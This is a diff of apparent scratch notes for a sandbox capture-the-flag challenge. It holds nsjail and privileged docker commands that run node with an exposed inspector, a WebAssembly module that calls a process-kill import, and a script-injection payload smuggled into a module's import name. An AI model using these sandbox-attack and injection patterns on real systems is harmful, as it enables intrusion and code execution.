@@ -1,0 +1,37 @@
+"nsjail", [
+            "-Mo", "-Q", "-e", "-N",
+            "--chroot", "/chroot/",
+            "--time_limit", "1",
+            "--",
+            "/usr/local/bin/node", "/sandbox.js"
+        ]
+        
+
+
+docker build -t chal . && docker run --rm -it -p 3000:3000 -p 9229:9229 --privileged chal nsjail -Mo -Q -e -N --chroot /chroot/ --time-limit 1 -- /usr/local/bin/node --inspect-brk=0.0.0.0:9229
+
+
+(module
+  (import "process" "_kill" (func $kill (param i32) (param i32)))
+  (func (export "main")
+    i32.const 0
+    i32.const 10
+    call $kill
+  )
+)
+
+
+(module
+  (import "process" "<script>eval(atob(``))</script>" (func (param i32)))
+)
+
+sudo sysctl -w kernel.unprivileged_userns_clone=1
+
+nsjail -Mo --chroot /chroot/ -- /usr/local/bin/node /sandbox.js
+nsjail -Mo --chroot /chroot/ -- sh
+
+echo asdf | nsjail -Mo --chroot /chroot/ --user 99999 --group 99999 -- /usr/local/bin/node /sandbox.js
+
+
+["-Mo", "--chroot", "/chroot/", "--", "/usr/local/bin/node /sandbox.js
+
